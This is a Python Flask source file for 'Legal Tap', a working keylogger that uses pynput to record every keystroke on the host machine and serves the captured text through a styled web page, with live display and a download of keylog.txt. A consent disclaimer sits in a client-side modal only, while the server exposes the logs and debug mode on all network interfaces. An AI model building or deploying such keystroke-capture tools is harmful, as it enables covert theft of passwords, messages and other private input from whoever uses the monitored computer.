from flask import Flask, render_template_string, request, jsonify, send_file
from pynput import keyboard
import threading
import os

app = Flask(__name__)

# Global variables to control keylogging
key_log = []
is_keylogging = False
lock = threading.Lock()

# Function to capture keystrokes
def start_keylogging():
    def on_press(key):
        global key_log, is_keylogging
        if is_keylogging:
            try:
                with lock:
                    key_log.append(key.char)
            except AttributeError:
                with lock:
                    key_log.append(str(key))

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Start the keylogging thread
threading.Thread(target=start_keylogging, daemon=True).start()

@app.route("/")
def index():
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Legal Tap</title>
        <style>
            body {
                font-family: 'Arial', sans-serif;
                margin: 0;
                padding: 0;
                background: linear-gradient(135deg, #001f3f, #0074D9);
                color: #fff;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }
            h1 {
                font-size: 3rem;
                text-transform: uppercase;
                margin-bottom: 20px;
                text-shadow: 0 4px 15px rgba(0, 116, 217, 0.6);
            }
            button {
                margin: 10px;
                padding: 15px 30px;
                font-size: 1.2rem;
                font-weight: bold;
                color: #fff;
                background: linear-gradient(90deg, #0074D9, #001f3f);
                border: none;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.3s ease;
                box-shadow: 0 4px 15px rgba(0, 116, 217, 0.5);
            }
            button:hover {
                transform: scale(1.05);
                background: linear-gradient(90deg, #001f3f, #0074D9);
                box-shadow: 0 6px 20px rgba(0, 116, 217, 0.7);
            }
            textarea {
                width: 80%;
                height: 200px;
                margin: 20px auto;
                background: #001f3f;
                color: #fff;
                border: 2px solid #0074D9;
                border-radius: 10px;
                padding: 15px;
                font-size: 1rem;
                resize: none;
                overflow-y: auto;
                box-shadow: 0 4px 10px rgba(0, 116, 217, 0.5);
            }
            textarea:focus {
                outline: none;
                border-color: #39CCCC;
                box-shadow: 0 0 10px #39CCCC;
            }
            .modal {
                display: none;
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #001f3f;
                color: #fff;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 8px 20px rgba(0, 116, 217, 0.8);
                z-index: 1000;
                width: 80%;
                max-width: 500px;
            }
            .modal h2 {
                font-size: 1.8rem;
                color: #39CCCC;
                margin-bottom: 10px;
            }
            .modal button {
                background: linear-gradient(90deg, #39CCCC, #0074D9);
                padding: 10px 20px;
                border-radius: 8px;
                border: none;
                color: #fff;
                font-weight: bold;
                cursor: pointer;
            }
            .modal input[type="checkbox"] {
                margin-right: 10px;
            }
            #overlay {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.7);
                z-index: 999;
            }
        </style>
    </head>
    <body>
        <h1>Legal Tap</h1>
        <button id="start">Start Keylogger</button>
        <button id="stop">Stop Keylogger</button>
        <textarea id="log-box" readonly></textarea>
        <button id="download">Download Log File</button>

        <div id="overlay"></div>
        <div class="modal" id="terms-modal">
            <h2>Terms and Conditions</h2>
            <p>
                This software is intended for monitoring purposes with explicit consent.
                Misuse of this software may result in legal consequences. The owner of this software
                is not responsible for any illegal use. By proceeding, you accept sole responsibility for your actions.
            </p>
            <label>
                <input type="checkbox" id="accept-terms" /> I accept the terms and conditions
            </label>
            <br><br>
            <button id="accept-button">Proceed</button>
        </div>

        <script>
            let isAccepted = false;

            document.getElementById("start").addEventListener("click", () => {
                if (!isAccepted) {
                    document.getElementById("overlay").style.display = "block";
                    document.getElementById("terms-modal").style.display = "block";
                } else {
                    startKeylogger();
                }
            });

            document.getElementById("accept-button").addEventListener("click", () => {
                const checkbox = document.getElementById("accept-terms");
                if (checkbox.checked) {
                    isAccepted = true;
                    document.getElementById("overlay").style.display = "none";
                    document.getElementById("terms-modal").style.display = "none";
                    startKeylogger();
                } else {
                    alert("You must accept the terms and conditions to proceed.");
                }
            });

            function startKeylogger() {
                fetch("/start", { method: "POST" });
            }

            document.getElementById("stop").addEventListener("click", () => {
                fetch("/stop", { method: "POST" });
            });

            document.getElementById("download").addEventListener("click", () => {
                window.location.href = "/download_logs";
            });

            setInterval(() => {
                fetch("/get_logs")
                    .then((response) => response.json())
                    .then((data) => {
                        document.getElementById("log-box").value = data.logs;
                    });
            }, 1000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route("/start", methods=["POST"])
def start():
    global is_keylogging
    is_keylogging = True
    return jsonify({"status": "Keylogging started"})

@app.route("/stop", methods=["POST"])
def stop():
    global is_keylogging
    is_keylogging = False
    return jsonify({"status": "Keylogging stopped"})

@app.route("/get_logs", methods=["GET"])
def get_logs():
    with lock:
        return jsonify({"logs": "".join(key_log)})

@app.route("/download_logs", methods=["GET"])
def download_logs():
    with lock:
        with open("keylog.txt", "w") as file:
            file.write("".join(key_log))
    return send_file("keylog.txt", as_attachment=True)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)


